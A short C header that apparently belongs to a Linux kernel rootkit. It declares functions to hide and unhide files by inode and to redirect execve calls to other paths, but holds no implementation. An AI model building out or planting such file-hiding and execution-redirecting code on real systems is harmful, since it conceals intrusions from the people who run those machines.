#ifndef __HIDE_FILE
#define __HIDE_FILE

int is_inode_hidden(u64);
void hide_inode(u64);
void unhide_inode(u64);
char *redirect_execve(char *);
void redirect_execve_path(char *, char *);
void unredirect_execve_path(char *);

#endif
